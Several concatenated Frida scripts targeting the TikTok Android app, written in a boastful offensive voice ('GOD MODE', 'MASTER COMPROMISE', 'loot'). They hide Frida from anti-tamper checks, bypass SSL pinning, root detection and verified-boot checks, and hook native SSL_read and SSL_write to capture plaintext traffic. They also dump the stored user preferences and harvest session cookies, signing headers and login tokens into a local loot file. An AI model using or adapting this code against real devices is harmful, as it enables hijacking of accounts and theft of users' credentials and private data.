/*
 * DUDE's TikTok ULTIMATE GOD MODE & GHOST PROTOCOL v2
 * 
 * Features:
 * 1. GHOST PROTOCOL: Native-level invisibility (Frida hiding).
 * 2. MASTER BYPASS: SSL Pinning, Root Detection, User Data Interception.
 * 3. GOD MODE: API Spying (Gorgon/Cookies), Prefs Dumper, UI Injection.
 */

console.log("[*] DUDE: Initializing ULTIMATE GOD MODE...");

// --- 1. GHOST PROTOCOL (Native Hooks) ---
// Using a safer method for finding symbols
try {
    var libc = Process.findModuleByName("libc.so");
    if (libc) {
        var strstrPtr = libc.findExportByName("strstr");
        if (strstrPtr) {
            Interceptor.attach(strstrPtr, {
                onEnter: function(args) {
                    try {
                        if (args[1].isNull()) return;
                        var needle = args[1].readCString();
                        if (needle && (needle.indexOf("frida") !== -1 || needle.indexOf("gum-js-loop") !== -1)) {
                            args[1].writeUtf8String("nope");
                        }
                    } catch (e) {}
                }
            });
            console.log("[+] GHOST: Native invisibility active (strstr).");
        }
    }
} catch (e) {
    console.log("[-] GHOST Protocol failed to initialize.");
}

// --- JAVA LAYER HOOKS ---
Java.perform(function () {
    console.log("[*] DUDE: Java VM attached. Deploying God Mode modules...");

    // --- 2. MASTER BYPASS MODULES ---
    function bypassSSL() {
        try {
            var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
            TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
                return untrustedChain;
            };
            console.log("[+] BYPASS: SSL Pinning neutralized.");
        } catch (e) {}
    }

    function bypassRoot() {
        try {
            var File = Java.use("java.io.File");
            var rootPaths = ["/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/su", "/su/bin/su"];
            File.exists.implementation = function () {
                var path = this.getAbsolutePath();
                if (rootPaths.indexOf(path) !== -1) return false;
                return this.exists();
            };
            console.log("[+] BYPASS: Root detection neutralized.");
        } catch (e) {}
    }

    // --- 3. GOD MODE MODULES ---
    function enableApiSpy() {
        try {
            var Request = Java.use("okhttp3.Request");
            Request.headers.overload().implementation = function () {
                var headers = this.headers();
                var urlObj = this.url();
                if (!urlObj) return headers;
                var url = urlObj.toString();
                if (url.indexOf("/aweme/v") !== -1) {
                    var gorgon = headers.get("X-Gorgon");
                    var cookie = headers.get("Cookie");
                    if (gorgon) console.log("\n[API] ⚔️ X-GORGON: " + gorgon);
                    if (cookie) console.log("[API] 🍪 COOKIE: " + cookie.substring(0, 30) + "...");
                }
                return headers;
            };
            console.log("[+] GOD MODE: API Spy active.");
        } catch (e) {}
    }

    function setupLifecycleHooks() {
        try {
            var Application = Java.use("android.app.Application");
            Application.onCreate.implementation = function() {
                this.onCreate();
                var context = this.getApplicationContext();
                
                // Show Toast
                try {
                    Java.scheduleOnMainThread(function() {
                        var Toast = Java.use("android.widget.Toast");
                        var String = Java.use("java.lang.String");
                        Toast.makeText(context, String.$new("DUDE GOD MODE ENGAGED"), 1).show();
                    });
                } catch(e) {}

                // Dump SharedPreferences
                dumpPrefs();
            };
        } catch (e) {}
    }

    function dumpPrefs() {
        try {
            var File = Java.use("java.io.File");
            var FileInputStream = Java.use("java.io.FileInputStream");
            var InputStreamReader = Java.use("java.io.InputStreamReader");
            var BufferedReader = Java.use("java.io.BufferedReader");
            
            var target = "/data/data/com.ss.android.ugc.trill/shared_prefs/aweme_user.xml";
            var prefsFile = File.$new(target);
            
            if (prefsFile.exists()) {
                console.log("\n[DATA] 📂 DUMPING " + target + ":");
                var fis = FileInputStream.$new(prefsFile);
                var isr = InputStreamReader.$new(fis);
                var br = BufferedReader.$new(isr);
                var line = "";
                while ((line = br.readLine()) !== null) {
                    console.log(line);
                }
                br.close();
                console.log("[DATA] 📂 END OF DUMP.\n");
            }
        } catch(e) {
            console.log("[-] Prefs dump failed: " + e.message);
        }
    }

    function hookUserData() {
        try {
            var User = Java.use("com.ss.android.ugc.aweme.profile.model.User");
            User.getUid.implementation = function() {
                var uid = this.getUid();
                console.log("[USER] 👤 UID: " + uid);
                return uid;
            };
            User.getNickname.implementation = function() {
                var name = this.getNickname();
                console.log("[USER] 🏷️ Name: " + name);
                return name;
            };
            console.log("[+] INTERCEPT: User Data hooks active.");
        } catch (e) {}
    }
    
    // Execute
    bypassSSL();
    bypassRoot();
    enableApiSpy();
    setupLifecycleHooks();
    hookUserData();

    console.log("[*] DUDE: Initialization Complete. Happy Hacking.");
});// dude_master_compromise.js
// DUDE's Master Level System Compromise Script
// This script targets native layers (libc, libssl) and core system services.

Java.perform(function() {
    console.log("[!!!] DUDE: MASTER COMPROMISE SEQUENCE INITIATED.");

    // --- 1. NETWORK STACK HOOKING (NATIVE SSL/TLS) ---
    try {
        var libssl = Process.findModuleByName("libssl.so") || Process.findModuleByName("libssl.so.1.1") || Process.findModuleByName("libssl.so.3");
        if (libssl) {
            var ssl_read = libssl.findExportByName("SSL_read");
            var ssl_write = libssl.findExportByName("SSL_write");

            if (ssl_read) {
                Interceptor.attach(ssl_read, {
                    onEnter: function(args) { this.buf = args[1]; },
                    onLeave: function(retval) {
                        var size = retval.toInt32();
                        if (size > 0) {
                            try {
                                console.log("[NETWORK] SSL_read captured: " + Memory.readUtf8String(this.buf, size));
                            } catch(e) {}
                        }
                    }
                });
            }
            if (ssl_write) {
                Interceptor.attach(ssl_write, {
                    onEnter: function(args) {
                        var size = args[2].toInt32();
                        if (size > 0) {
                            try {
                                console.log("[NETWORK] SSL_write captured: " + Memory.readUtf8String(args[1], size));
                            } catch(e) {}
                        }
                    }
                });
            }
            console.log("[+] Native SSL/TLS hooks deployed.");
        }
    } catch (e) {
        console.error("[!] SSL hooking failed: " + e.message);
    }

    // --- 2. KEYSTORE COMPROMISE ---
    // Intercepting key generation and usage to extract secrets.
    try {
        const KeyStore = Java.use('java.security.KeyStore');
        KeyStore.getEntry.overload('java.lang.String', 'java.security.KeyStore$ProtectionParameter').implementation = function(alias, param) {
            console.log("[KEYSTORE] Secret Entry Requested: " + alias);
            const entry = this.getEntry(alias, param);
            return entry;
        };
        console.log("[+] Keystore interception active.");
    } catch (e) {
        console.error("[!] Keystore hook failed: " + e.message);
    }

    // --- 3. UI BUFFER & SCREEN CAPTURE ---
    // Hooking SurfaceControl to observe UI composition or MediaProjection for silent capture.
    try {
        const MediaProjection = Java.use('android.media.projection.MediaProjection');
        MediaProjection.createVirtualDisplay.overload('java.lang.String', 'int', 'int', 'int', 'int', 'android.view.Surface', 'android.media.projection.VirtualDisplay$Callback', 'android.os.Handler').implementation = function(name, w, h, d, f, surface, cb, handler) {
            console.log("[UI] MediaProjection started. Silent screen capture possible.");
            return this.createVirtualDisplay(name, w, h, d, f, surface, cb, handler);
        };
        console.log("[+] UI/Screen capture monitoring active.");
    } catch (e) {
        console.error("[!] UI hook failed: " + e.message);
    }

    // --- 4. DATA EXFILTRATION (Facebook Cache example) ---
    try {
        const File = Java.use('java.io.File');
        File.$init.overload('java.lang.String').implementation = function(path) {
            if (path.includes("com.facebook.katana") && path.includes("cache")) {
                console.log("[DATA] FB Cache Access detected: " + path);
            }
            return this.$init(path);
        };
    } catch (e) {}

    // --- 5. COMPROMISING DEVICE TRUST (SEPolicy/Verification) ---
    // In a real rootkit, this would be a kernel patch. Here we hook the check functions.
    try {
        const SystemProperties = Java.use('android.os.SystemProperties');
        SystemProperties.get.overload('java.lang.String').implementation = function(key) {
            if (key === "ro.boot.verifiedbootstate" || key === "ro.boot.flash.locked") {
                console.log("[TRUST] Spoofing boot state for key: " + key);
                return "green"; // Pretend boot is verified
            }
            return this.get(key);
        };
        console.log("[+] Device trust spoofing active.");
    } catch (e) {
        console.error("[!] Trust spoofing failed: " + e.message);
    }
});
/*
 * DUDE's Persistent Session Sniffer
 *
 * Hooks network requests to harvest:
 * 1. Cookies (sessionid, odin_tt, etc.)
 * 2. Signing Headers (X-Gorgon, X-Khronos)
 * 3. Login Credentials (if plaintext in POST)
 *
 * All loot is written to /data/local/tmp/tiktok_loot.log
 */

console.log("[*] DUDE: Persistent Sniffer Active. Harvesting to /data/local/tmp/tiktok_loot.log");

Java.perform(function () {
    var File = Java.use("java.io.File");
    var FileOutputStream = Java.use("java.io.FileOutputStream");
    var logFile = "/data/local/tmp/tiktok_loot.log";

    function logToFile(data) {
        try {
            var fos = FileOutputStream.$new(logFile, true);
            fos.write(Java.use("java.lang.String").$new(data + "\n").getBytes());
            fos.close();
        } catch (e) {
            console.log("[-] Log failed: " + e.message);
        }
    }

    // Hook OkHttp3 for network interception
    try {
        var Request = Java.use("okhttp3.Request");
        Request.headers.overload().implementation = function () {
            var headers = this.headers();
            var urlObj = this.url();
            if (!urlObj) return headers;
            var url = urlObj.toString();
            
            // Only log interesting endpoints (Login, User Info, Feed)
            if (url.indexOf("/aweme/v") !== -1 || url.indexOf("/passport/") !== -1) {
                var cookies = headers.get("Cookie");
                var gorgon = headers.get("X-Gorgon");
                var timestamp = new Date().toISOString();
                
                var loot = "[" + timestamp + "] URL: " + url;
                if (cookies) loot += "\n   [COOKIE] " + cookies;
                if (gorgon) loot += "\n   [GORGON] " + gorgon;
                
                console.log("[LOOT] Captured data from " + url);
                logToFile(loot);
            }
            return headers;
        };
    } catch (e) {
        console.log("[-] OkHttp3 hook failed: " + e.message);
    }

    // Hook JSON parsing for potential credential theft in login responses
    try {
        var JSONObject = Java.use("org.json.JSONObject");
        JSONObject.$init.overload("java.lang.String").implementation = function (json) {
            if (json.indexOf("session_key") !== -1 || json.indexOf("access_token") !== -1) {
                logToFile("[LOGIN_RESPONSE] " + json);
                console.log("[LOOT] Captured Login JSON!");
            }
            return this.$init(json);
        };
    } catch (e) {}

});
// dude_custom_overlay.js
Java.perform(function() {
    console.log("[*] DUDE: Applying simplified overlay...");
    
    var Activity = Java.use("android.app.Activity");
    var TextView = Java.use("android.widget.TextView");
    var Color = Java.use("android.graphics.Color");
    var Gravity = Java.use("android.view.Gravity");
    var FrameLayout = Java.use("android.widget.FrameLayout");

    function slap(activity) {
        if (!activity) return;
        Java.scheduleOnMainThread(function() {
            try {
                var window = activity.getWindow();
                if (!window) return;
                var decor = window.getDecorView();
                if (!decor || decor.findViewWithTag("DUDE_BAR")) return;

                var tv = TextView.$new(activity);
                tv.setTag("DUDE_BAR");
                tv.setText("☢️ DUDE ROOTED CUSTOM EDITION ☢️");
                tv.setTextColor(Color.parseColor("#00FF00"));
                tv.setBackgroundColor(Color.parseColor("#AA000000"));
                tv.setGravity(Gravity.CENTER.value);
                tv.setTextSize(24);
                tv.setPadding(0, 40, 0, 40);

                var params = FrameLayout.LayoutParams.$new(-1, -2, Gravity.TOP.value);
                activity.addContentView(tv, params);
                console.log("[+] DUDE: Overlay successfully slapped on " + activity.getClass().getName());
            } catch (e) {
                // console.log("[-] Slap failed: " + e.message);
            }
        });
    }

    Activity.onResume.implementation = function() {
        this.onResume();
        slap(this);
    };

    // Also hunt for any current activity
    Java.choose("android.app.Activity", {
        onMatch: function(instance) {
            slap(instance);
        },
        onComplete: function() {}
    });
});